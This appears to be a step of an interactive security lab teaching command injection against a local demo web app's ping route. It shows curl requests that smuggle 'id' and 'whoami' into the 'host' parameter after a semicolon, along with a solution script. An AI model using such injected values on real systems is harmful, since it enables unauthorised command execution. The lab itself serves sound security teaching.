# Command injection

The `/cmd-subprocess` route builds a `ping` command from the `host`
parameter and runs it through a shell. A shell treats `;` as "and then run
this":

`curl -sG http://127.0.0.1:5000/cmd-subprocess --data-urlencode "host=127.0.0.1; id"; echo`{{exec}}

At the end of `stdout`, after the ping output, is the output of `id`: the app
ran a command you chose, as the user the app runs as.

**Your task:** find the name of that user and save it to `/root/app-user.txt`.

<details><summary>Show a solution</summary>

```plain
curl -sG http://127.0.0.1:5000/cmd-subprocess --data-urlencode "host=127.0.0.1; whoami" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["stdout"].strip().splitlines()[-1])' \
  > /root/app-user.txt
cat /root/app-user.txt
```{{exec}}

</details>
